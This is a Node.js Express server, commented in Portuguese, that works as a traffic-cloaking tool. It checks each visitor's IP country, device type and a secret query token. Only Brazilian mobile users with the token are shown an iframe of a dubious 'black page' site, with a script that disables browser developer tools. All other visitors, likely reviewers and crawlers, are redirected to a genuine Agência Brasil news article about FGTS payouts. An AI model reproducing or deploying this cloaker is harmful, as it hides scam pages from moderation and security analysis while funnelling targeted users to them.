const express = require("express");
const axios = require("axios");
const MobileDetect = require("mobile-detect");

const app = express();
const port = process.env.PORT || 3000;

// Configurações das páginas
const whitePage =
  process.env.WHITE_PAGE ||
  "https://agenciabrasil.ebc.com.br/radioagencia-nacional/economia/audio/2024-08/trabalhadores-vao-receber-parte-do-lucro-de-r-152-bilhoes-do-fgts";
const blackPage =
  process.env.BLACK_PAGE ||
  "https://verificardistribuicao.site/rosinha-oficial-berlim/";

// Parâmetros de segurança
const securityParamName = process.env.SECURITY_PARAM_NAME || "JS1CLdcHVbKA";
const securityParamValue = process.env.SECURITY_PARAM_VALUE || "LBowyKAwmgeO";

// Função para verificar país do IP
async function getCountryFromIP(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    return response.data.countryCode;
  } catch (error) {
    console.error("Erro ao obter país do IP:", error);
    return null;
  }
}

// Middleware principal
app.get("*", async (req, res) => {
  try {
    // Detectar dispositivo móvel
    const md = new MobileDetect(req.headers["user-agent"]);
    const isMobile = md.mobile() !== null;

    // Obter IP e país
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const country = await getCountryFromIP(ip);

    // Verificar parâmetros de segurança
    const paramValid = req.query[securityParamName] === securityParamValue;

    // Verificar condições para blackPage
    const showBlackPage = isMobile && country === "BR" && paramValid;

    if (showBlackPage) {
      // Renderizar iframe com blackPage
      const html = `
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="utf-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1">
                    <title>Página Oficial</title>
                    <style>
                        * { margin: 0; padding: 0; }
                        iframe { border: none; width: 100%; height: 100vh; }
                    </style>
                </head>
                <body>
                    <iframe src="${blackPage}?${new URLSearchParams(
        req.query
      ).toString()}"></iframe>
                    <script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
                </body>
                </html>
            `;
      res.send(html);
    } else {
      // Redirecionar para whitePage
      res.redirect(whitePage + "?" + new URLSearchParams(req.query).toString());
    }
  } catch (error) {
    console.error("Erro:", error);
    res.redirect(whitePage);
  }
});

app.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});
